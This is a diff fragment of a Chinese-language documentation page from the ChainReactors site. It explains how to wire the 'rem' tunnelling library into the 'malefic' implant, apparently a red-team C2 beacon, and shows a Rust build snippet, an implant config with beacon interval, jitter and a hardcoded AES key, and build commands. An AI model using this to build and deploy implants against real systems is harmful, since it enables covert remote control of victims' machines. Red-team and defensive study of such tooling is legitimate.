+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">target_arch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">env</span><span class="p">::</span><span class="n">var</span><span class="p">(</span><span class="s">&quot;CARGO_CFG_TARGET_ARCH&quot;</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">  </span>
+
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">rem_config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LibraryConfig</span><span class="p">::</span><span class="n">new</span><span class="p">(</span><span class="w">  </span>
+<span class="w">        </span><span class="s">&quot;REM&quot;</span><span class="p">,</span><span class="w">  </span>
+<span class="w">        </span><span class="fm">vec!</span><span class="p">[</span><span class="s">&quot;windows&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;linux&quot;</span><span class="p">],</span><span class="w">  </span>
+<span class="w">        </span><span class="fm">vec!</span><span class="p">[</span><span class="s">&quot;x86_64&quot;</span><span class="p">],</span><span class="w">  </span>
+<span class="w">        </span><span class="s">&quot;librem_community_{os}_{arch}.a&quot;</span><span class="p">,</span><span class="w">  </span>
+<span class="w">        </span><span class="fm">vec!</span><span class="p">[</span><span class="s">&quot;ws2_32&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;userenv&quot;</span><span class="p">],</span><span class="w">  </span>
+<span class="w">    </span><span class="p">);</span><span class="w">  </span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rem_config</span><span class="p">.</span><span class="n">link_library</span><span class="p">(</span><span class="o">&amp;</span><span class="n">resources_path</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">target_os</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">target_arch</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">        </span><span class="fm">panic!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+<span class="p">}</span>
+</code></pre></div></p>
+<p>实现对应的implant transport，见: <a href="https://github.com/chainreactors/malefic/blob/master/malefic-core/src/transport/rem/mod.rs">https://github.com/chainreactors/malefic/blob/master/malefic-core/src/transport/rem/mod.rs</a></p>
+<p>对于使用者来说， 修改implant 的config.yaml</p>
+<div class="highlight"><pre><span></span><code><span class="nt">basic</span><span class="p">:</span><span class="w">  </span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;malefic&quot;</span><span class="w">  </span>
+<span class="w">  </span><span class="nt">targets</span><span class="p">:</span><span class="w">  </span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;127.0.0.1:5001&quot;</span><span class="w">  </span>
+<span class="w">  </span><span class="nt">protocol</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;rem&quot;</span><span class="w">  </span>
+<span class="w">  </span><span class="nt">tls</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span><span class="w">  </span>
+<span class="w">  </span><span class="nt">proxy</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w">  </span>
+<span class="w">  </span><span class="nt">interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5</span><span class="w">  </span>
+<span class="w">  </span><span class="nt">jitter</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">0.2</span><span class="w">  </span>
+<span class="w">  </span><span class="nt">ca</span><span class="p">:</span><span class="w">  </span>
+<span class="w">  </span><span class="nt">encryption</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">aes</span><span class="w">  </span>
+<span class="w">  </span><span class="nt">key</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">maliceofinternal</span><span class="w">  </span>
+<span class="w">  </span><span class="nt">rem</span><span class="p">:</span><span class="w">  </span>
+<span class="w">    </span><span class="nt">link</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;[rem_link]&#39;</span>
+</code></pre></div>
+<p>运行mutant生成编译配置并编译</p>
+<div class="highlight"><pre><span></span><code>malefic-mutant<span class="w"> </span>generate<span class="w"> </span>beacon
+
+cargo<span class="w"> </span>build<span class="w"> </span>--release<span class="w"> </span>-p<span class="w"> </span>malefic
+</code></pre></div>
+<h2 id="结语">结语<a class="headerlink" href="#结语" title="Permanent link">&para;</a></h2>
+<p>rem实际上已经重构了4次，不断的拓展能力的边界， 已经不是一个单纯的代理工具，而是开发框架。 </p>
+<p>在发布时， 我考虑了很长时间如何去掉一些具有过强攻击性的能力又不影响其架构。目前发布的版本包含了所有的基本功能，但在一些特殊的模块上没有对外暴露或者需要手动配置又或者需要简单二开(cursor就可以完美胜任)。 </p>
+<p>网络侧的攻防也不仅限于本文提到的内容， 实际上还有更多的玩法和思路。</p>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2025 ChainReactors
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/chainreactors" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.indexes", "toc.integrate", "toc.follo", "navigation.top", "header.autohide", "search.share", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+    
+  </body>
+</html>
